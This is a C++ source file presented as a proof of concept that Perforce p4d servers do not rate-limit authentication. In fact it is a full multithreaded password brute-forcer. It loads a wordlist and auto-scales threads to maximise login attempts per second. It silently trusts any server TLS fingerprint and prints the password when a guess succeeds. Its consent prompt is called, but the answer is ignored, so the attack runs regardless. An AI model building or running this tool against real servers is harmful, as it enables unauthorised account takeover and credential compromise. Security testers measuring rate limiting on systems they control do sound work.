// p4_auth_hammer_poc.cpp
//
// PoC to prove Perforce p4d does not effectively rate limit.
//
// *** EXTREMELY IMPORTANT DISCLAIMER ***
// This program is provided AS IS, for EDUCATIONAL purposes ONLY.
// Run ONLY against servers you own.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <mutex>
#include <algorithm>
#include <chrono>

// Perforce C++ API Headers
#include <error.h>
#include <p4libs.h>
#include <clientapi.h> 
#include <errornum.h>

// --- Configuration ---
#define MAX_CONSECUTIVE_CONN_FAILS 5
#define TRUST_FILE_NAME "./poc_trust.txt" 
#define SAMPLE_WINDOW_MS 500 // For status updates
// --- End Configuration ---

// Global Data
std::vector<std::string> g_passwords;
std::atomic<size_t> g_pw_index(0);
double g_min_improvement_thresh = 0.20; // For dynamic thread count optimization

// Auth Mode Control
std::atomic<bool> g_ticket_auth(false);

// Global Sync
std::mutex print_mutex;
std::mutex trust_file_mutex; 
std::atomic<int> global_attempts(0);
std::atomic<int> global_auth_fails(0);
std::atomic<int> global_successes(0);
std::atomic<int> global_conn_errors(0);

// Dynamic Thread Control
std::atomic<int> g_max_allowed_threads(0); 
std::vector<std::thread> g_thread_pool;
std::mutex pool_mutex;

// Global Knowledge
std::atomic<bool> global_use_unicode(false); 
std::atomic<bool> global_use_ssl(false);

// Helper for case-insensitive search to parse server messages
bool contains_ignore_case(const std::string& haystack, const std::string& needle) {
    auto it = std::search(
        haystack.begin(), haystack.end(),
        needle.begin(), needle.end(),
        [](char ch1, char ch2) { return std::toupper(ch1) == std::toupper(ch2); }
    );
    return (it != haystack.end());
}

// --- Custom ClientUser ---
class PocClientUser : public ClientUser {
public:
    bool anyErrorEncountered; 
    bool unicodeRequired;
    bool sslRequired;
    bool trustRequired;
    bool connectionDropped;
    StrBuf errorMsg;
    
    // For Ticket Auth Prompt handling
    StrBuf storedPassword;

    PocClientUser() { ClearErrors(); }

    void ClearErrors() {
        anyErrorEncountered = false;
        unicodeRequired = false;
        sslRequired = false;
        trustRequired = false;
        connectionDropped = false;
        errorMsg.Clear();
    }
    
    void SetCurrentPassword(const std::string& pw) {
        storedPassword.Set(pw.c_str());
    }

    // Override Prompt to supply the password when requested (e.g., during 'login')
    virtual void Prompt( const StrPtr &msg, StrBuf &rsp, int noEcho, Error *e ) {
        rsp.Set(storedPassword);
    }

    // Print server response messages and errors to console
    virtual void HandleError( Error *err ) {
        anyErrorEncountered = true; 
        StrBuf msg;
        err->Fmt( &msg );
        
        // Print servers messages but not in case of auth failure to stop spamming.
        if (!contains_ignore_case(msg.Text(), "invalid or unset") && 
            !contains_ignore_case(msg.Text(), "password invalid"))
        {
            std::lock_guard<std::mutex> lock(print_mutex);
            fprintf(stderr, "[SERVER MSG] %s\n", msg.Text());
        }

        AnalyzeMessage(msg.Text());
    }
    
    virtual void OutputError( const char *errBuf ) {
        anyErrorEncountered = true;
        
        {
            std::lock_guard<std::mutex> lock(print_mutex);
            fprintf(stderr, "[SERVER ERR] %s\n", errBuf);
        }

        AnalyzeMessage(errBuf);
    }

    virtual void OutputText( const char *data, int length ) {
        // Only print text if it's not the standard "Enter password" prompt to keep output clean
        if (g_ticket_auth && strncmp(data, "Enter password", 14) == 0) return;

        {
            std::lock_guard<std::mutex> lock(print_mutex);
            fprintf(stdout, "[SERVER TEXT] %.*s\n", length, data);
        }
        AnalyzeMessage(data);
    }
    
    virtual void OutputInfo( char level, const char *data ) {
        // Usually safe to ignore for auth, but printing for debug
        // {
        //    std::lock_guard<std::mutex> lock(print_mutex);
        //    fprintf(stdout, "[SERVER INFO] %s\n", data);
        // }
    }

    // --- MESSAGE ANALYSIS ---
    void AnalyzeMessage(const char* text) {
        std::string msgStr(text);
        if (errorMsg.Length() > 0) errorMsg.Append("\n");
        errorMsg.Append(text);

        // 1. Connection Drops
        if (contains_ignore_case(msgStr, "Partner exited") || 
            contains_ignore_case(msgStr, "Connection reset") || 
            contains_ignore_case(msgStr, "TCP connect") ||
            contains_ignore_case(msgStr, "read: -1")) {
            connectionDropped = true;
        }

        // 2. Unicode Specific Check - Server is unicode and demands unicode
        if (contains_ignore_case(msgStr, "Unicode server permits")) {
            printf("Server is unicode, attempting to switch to unicode. If this fails, ensure you're running in a unicode environment.\n");
            fflush(stdout);
            unicodeRequired = true;
            connectionDropped = true; // Requires re-init
        }

        // 3. Unicode Specific Check - Server is not unicode enabled - force exit
        if (contains_ignore_case(msgStr, "Unicode clients require")) {
            unicodeRequired = false;
            connectionDropped = true;
            printf("Client is running unicode and server is not. GOING TO EXIT. Set env var P4CHARSET=none and try again.\n");
            fflush(stdout);
            std::this_thread::sleep_for(std::chrono::milliseconds(SAMPLE_WINDOW_MS));
            exit(1); // Force exit
        }

        // 4. SSL Check
        // We only set sslRequired if the text explicitly mentions SSL.
        if (contains_ignore_case(msgStr, "server using SSL") || 
            contains_ignore_case(msgStr, "Client must add SSL") ||
            contains_ignore_case(msgStr, "check $P4PORT") ||
            contains_ignore_case(msgStr, "handshake")) {
            printf("Attempting to auto-enable SSL mode and trust server...\n");
            fflush(stdout);
            sslRequired = true;
            connectionDropped = true; // Requires re-init
        }

        // 5. Trust Specific Check
        if ((contains_ignore_case(msgStr, "authenticity") && contains_ignore_case(msgStr, "established")) || 
             contains_ignore_case(msgStr, "fingerprint")) {
            trustRequired = true;
            connectionDropped = true; // Requires re-init
        }
    }
    
    virtual void OutputStat( StrDict *varList ) {}
    virtual void OutputBinary( const char *data, int length ) {}
};

// --- Trust Helper ---
bool EstablishTrust(const std::string& errorMsg, ClientApi* client) {
    std::lock_guard<std::mutex> lock(trust_file_mutex);
    std::string serverPort;
    std::string fingerprint;

    size_t startQuote = errorMsg.find("'");
    size_t endQuote = errorMsg.find("'", startQuote + 1);
    if (startQuote != std::string::npos && endQuote != std::string::npos) {
        serverPort = errorMsg.substr(startQuote + 1, endQuote - startQuote - 1);
    } else {
        serverPort = client->GetPort().Text();
        if (serverPort.find("ssl:") == 0) serverPort = serverPort.substr(4);
    }

    size_t fpPos = errorMsg.find("fingerprint");
    if (fpPos != std::string::npos) {
        size_t newlinePos = errorMsg.find('\n', fpPos);
        if (newlinePos != std::string::npos) {
            size_t startFp = newlinePos + 1;
            while (startFp < errorMsg.length() && isspace(errorMsg[startFp])) startFp++;
            size_t endFp = startFp;
            while (endFp < errorMsg.length() && !isspace(errorMsg[endFp])) endFp++;
            if (endFp > startFp) fingerprint = errorMsg.substr(startFp, endFp - startFp);
        }
    }

    if (fingerprint.empty()) return false;

    struct stat buffer;
    if (stat(TRUST_FILE_NAME, &buffer) == 0) chmod(TRUST_FILE_NAME, S_IRUSR | S_IWUSR);
    
    std::ofstream outfile(TRUST_FILE_NAME, std::ios_base::app);
    if (outfile.is_open()) {
        outfile << serverPort << "=**++**:" << fingerprint << "\n";
        outfile << "ssl:" << serverPort << "=**++**:" << fingerprint << "\n";
        outfile.close();
        chmod(TRUST_FILE_NAME, S_IRUSR);
        
        std::lock_guard<std::mutex> p_lock(print_mutex);
        printf("[INFO] Trust established for %s\n", serverPort.c_str());
        return true;
    }
    return false;
}

// --- Worker Thread ---
void worker_thread(int thread_id, std::string base_port, std::string user) {
    std::string current_port = base_port;
    ClientApi client;
    PocClientUser ui;
    Error e;
    StrBuf password_buf;
    bool connected = false;
    int consecutive_fails = 0;

    // Ticket setup if required
    StrBuf ticketFile;
    if (g_ticket_auth) {
        char *home = getenv( "HOME" );
        if( home ) {
            ticketFile.Set( home );
            ticketFile.Append( "/.p4tickets" );
        }
    }

    size_t my_idx = g_pw_index.fetch_add(1);

    while (my_idx < g_passwords.size()) {
        
        // --- EXIT CHECKS ---
        if (thread_id >= g_max_allowed_threads.load()) {
             if (connected) client.Final(&e);
             return; 
        }
        if (global_successes.load() > 0) {
            if (connected) client.Final(&e);
            return;
        }

        if (!connected) {
            if (consecutive_fails >= MAX_CONSECUTIVE_CONN_FAILS) consecutive_fails = 0; 

            // Only switch port string to SSL if GLOBAL knowledge says so
            if (global_use_ssl.load() && current_port.find("ssl:") == std::string::npos) {
                current_port = "ssl:" + base_port;
            }

            client.SetPort(current_port.c_str());
            client.SetUser(user.c_str());
            client.SetProg("p4_auth_hammer_poc");
            client.SetVersion("2025.2"); // Does not work. Bug in P4 API for C++
            client.SetTrustFile(TRUST_FILE_NAME);
            
            // Set Ticket File if in Ticket Mode
            if (g_ticket_auth && ticketFile.Length() > 0) {
                client.SetTicketFile(ticketFile.Text());
            }

            if (global_use_unicode.load()) client.SetTrans(1); // Use unicode if we need to

            e.Clear();
            client.Init(&e);

            if (e.Test()) {
                // Init Failure
                ui.ClearErrors();
                ui.HandleError(&e); // Prints error & analyzes text

                if (ui.sslRequired) {
                    if (!global_use_ssl.load()) {
                        global_use_ssl.store(true);
                        std::lock_guard<std::mutex> lock(print_mutex);
                        printf("\n[INFO] Detected SSL Requirement. Switching protocol.\n");
                    }
                } 
                else if (ui.trustRequired) {
                    EstablishTrust(ui.errorMsg.Text(), &client);
                }
                else if (ui.unicodeRequired) {
                    global_use_unicode.store(true);
                }
                else {
                    // Standard connection error (timeout, refused, etc)
                    global_conn_errors++;
                }
                
                consecutive_fails++;
                continue; 
            } 
            else {
                connected = true;
                consecutive_fails = 0;
            }
        }

        std::string pw_str = g_passwords[my_idx];
        ui.ClearErrors();
        
        if (g_ticket_auth) {
            // TICKET MODE:
            // 1. Set the password in the UI object so Prompt() can use it
            ui.SetCurrentPassword(pw_str);
            // 2. Run 'login' which triggers Prompt(). Do NOT call SetPassword on client.
            client.Run("login", &ui);
        } else {
            // STANDARD MODE:
            // 1. Set password directly on client
            password_buf.Set(pw_str.c_str());
            client.SetPassword(&password_buf);
            // 2. Run a command (depots) to test auth
            client.Run("depots", &ui);
        }

        // --- RESULT ANALYSIS ---
        
        // 1. Connection Drop / Setup Issue (RETRY)
        if (ui.connectionDropped) {
            connected = false;
            client.Final(&e);
            
            // SSL check again
            if (ui.sslRequired && !global_use_ssl.load()) global_use_ssl.store(true);
            else if (ui.trustRequired) EstablishTrust(ui.errorMsg.Text(), &client);
            else if (ui.unicodeRequired && !global_use_unicode.load()) global_use_unicode.store(true);
            
            // If it was just a drop/reconfig, retry this password
            if (!ui.anyErrorEncountered || ui.sslRequired || ui.trustRequired || ui.unicodeRequired) {
                continue; 
            }
        }

        // 2. Any OTHER Error means FAILURE (Increment Fail)
        if (ui.anyErrorEncountered) {
            global_auth_fails++;
            global_attempts++;
            my_idx = g_pw_index.fetch_add(1);
        } 
        else {
            // 3. NO Errors means SUCCESS
            global_successes++;
            global_attempts++;
            
            g_pw_index.store(g_passwords.size()); // Stop other threads from trying any more passwords.

            std::lock_guard<std::mutex> lock(print_mutex);
            printf("\n==================================================\n");
            printf("[CRITICAL] SUCCESSFUL AUTHENTICATION FOUND!\n");
            printf("       Server: %s\n", current_port.c_str());
            printf("         User: %s\n", user.c_str());
            printf("     Password: %s\n", pw_str.c_str());
            if (g_ticket_auth) {
                 printf("      Method: Ticket Login (Ticket generated)\n");
            }
            printf("==================================================\n");
            fflush(stdout);
            
            if (connected) client.Final(&e);
            return; 
        }
    }
    if (connected) client.Final(&e);
}

// --- Dynamic Pool Manager ---
void AdjustWorkerPool(int target_count, const char* port, const char* user) {
    std::lock_guard<std::mutex> lock(pool_mutex);
    int current_size = g_thread_pool.size();
    g_max_allowed_threads.store(target_count);
    if (target_count > current_size) {
        for (int i = current_size; i < target_count; ++i) {
            g_thread_pool.push_back(std::thread(worker_thread, i, std::string(port), std::string(user)));
        }
    }
}

enum TunerState {
    DOUBLING,
    INCREMENTAL,
    STABILIZED
};

int display_disclaimer_and_get_consent() {
    printf("\n*** WARNING: PERFORCE AUTHENTICATION RATE PoC ***\n");
    printf("This will attempt thousands of logins against the target.\n");
    printf("Run ONLY against servers you own or have permission to.\n");
    printf("Type 'YES' to continue: ");

    char consent[10];
    if (fgets(consent, sizeof(consent), stdin) == NULL) return 0;
    consent[strcspn(consent, "\n")] = 0;

    if (strcmp(consent, "YES") == 0) return 1;
    return 0;
}

int main(int argc, char **argv) {
    if (argc < 4 || argc > 5) {
        fprintf(stderr, "Usage: %s <server:port> <username> <password_file> [-ticketauth]\n", argv[0]);
        return 1;
    }
    
    // Check for optional Ticket Auth flag
    if (argc == 5) {
        if (strcmp(argv[4], "-ticketauth") == 0) {
            g_ticket_auth = true;
            printf("[INFO] Mode: Ticket Authentication (login command)\n");
        } else {
             fprintf(stderr, "Unknown argument: %s\n", argv[4]);
             return 1;
        }
    }

    remove(TRUST_FILE_NAME);

    display_disclaimer_and_get_consent();

    std::ifstream infile(argv[3]);
    std::string line;
    while (std::getline(infile, line)) {
        if (!line.empty() && line.back() == '\r') line.pop_back();
        if (!line.empty()) g_passwords.push_back(line);
    }
    
    if (g_passwords.empty()) {
        printf("No passwords loaded.\n");
        return 0;
    }

    Error e;
    P4Libraries::Initialize(P4LIBRARIES_INIT_ALL, &e);
    
    unsigned int nproc = std::thread::hardware_concurrency();
    if (nproc == 0) nproc = 4;
    
    int current_thread_target = nproc;
    int last_good_thread_count = nproc;
    double best_throughput = 0.0;
    
    TunerState state = DOUBLING;

    printf("[INFO] Loaded %zu passwords.\n", g_passwords.size());
    printf("[INFO] Starting with %d threads...\n", current_thread_target);

    AdjustWorkerPool(current_thread_target, argv[1], argv[2]);

    auto start_time = std::chrono::steady_clock::now();
    auto last_check_time = start_time;
    int last_attempt_count = 0;
    bool just_adjusted = false; 

    size_t total_pw = g_passwords.size();

    while(true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(SAMPLE_WINDOW_MS));

        if (global_successes.load() > 0) {
            printf("\n[INFO] Success detected. Halting operations...\n");
            break; 
        }
        
        auto now = std::chrono::steady_clock::now();
        int current_total = global_attempts.load();
        int current_errors = global_conn_errors.load();

        std::chrono::duration<double> diff_delta = now - last_check_time;
        double delta_secs = diff_delta.count();
        int delta_attempts = current_total - last_attempt_count;
        
        double inst_throughput = (delta_secs > 0) ? (double)delta_attempts / delta_secs : 0.0;

        // --- AUTO THREAD TUNER LOGIC ---
        if (state != STABILIZED && delta_secs > 0.4) { 
            if (just_adjusted) {
                just_adjusted = false; 
            }
            else {
                bool panic = false;
                if (delta_attempts > 10 && (double)(current_errors) / delta_attempts > 0.1) {
                     panic = true;
                }

                if (panic) {
                    state = STABILIZED; 
                    current_thread_target = (nproc > 4) ? nproc : 4; 
                    AdjustWorkerPool(current_thread_target, argv[1], argv[2]);
                    just_adjusted = true;
                }
                else {
                    double required_throughput = best_throughput * (1.0 + g_min_improvement_thresh);

                    if (inst_throughput > required_throughput || best_throughput == 0.0) {
                        best_throughput = inst_throughput;
                        last_good_thread_count = current_thread_target;
                        
                        if (state == DOUBLING && last_good_thread_count < 384) current_thread_target *= 2;
                        else if (state == INCREMENTAL) current_thread_target += 10;
                        
                        AdjustWorkerPool(current_thread_target, argv[1], argv[2]);
                        just_adjusted = true;
                    }
                    else {
                        if (state == DOUBLING) {
                            current_thread_target = last_good_thread_count;
                            AdjustWorkerPool(current_thread_target, argv[1], argv[2]);
                            just_adjusted = true;
                            state = INCREMENTAL;
                            g_min_improvement_thresh = 0.02;
                            best_throughput = 0; 
                        } 
                        else {
                            current_thread_target = last_good_thread_count;
                            AdjustWorkerPool(current_thread_target, argv[1], argv[2]);
                            state = STABILIZED;
                        }
                    }
                }
            }
        }

        const char* state_str = "";
        switch(state) {
            case DOUBLING: state_str = "Probing (x2)"; break;
            case INCREMENTAL: state_str = "Probing (+10)"; break;
            case STABILIZED: state_str = "Locked"; break;
        }

        printf("\r[%s] Threads: %d | T/put: %.1f/s (Best: %.1f) | Progress: %d/%zu | Fails: %d | Err: %d   ", 
               state_str,
               g_max_allowed_threads.load(),
               inst_throughput,
               best_throughput,
               current_total, total_pw, 
               global_auth_fails.load(), global_conn_errors.load());
        fflush(stdout);

        last_attempt_count = current_total;
        last_check_time = now;

        if (g_pw_index.load() >= total_pw && current_total >= (int)total_pw) break;
        if (g_pw_index.load() >= total_pw && !just_adjusted) break; 
    }

    for (auto& t : g_thread_pool) {
        if (t.joinable()) t.join();
    }

    auto end_time = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsed_seconds = end_time - start_time;
    double elapsed = elapsed_seconds.count();

    printf("\n\n--- Summary ---\n");
    printf("Total Time:    %.4f s\n", elapsed);
    printf("Successes:     %d\n", global_successes.load());
    
    P4Libraries::Shutdown(P4LIBRARIES_INIT_ALL, &e);
    return 0;
}